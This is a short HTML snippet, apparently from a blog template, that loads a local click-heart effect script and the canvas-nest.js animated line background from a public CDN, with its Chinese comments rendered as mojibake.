<!-- é¡µé¢ç‚¹å‡»å°çº¢å¿ƒ -->
<script type="text/javascript" src="/js/love.js"></script>
<!--åŠ¨æ€çº¿æ¡èƒŒæ™¯-->
<script type="text/javascript"
color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script>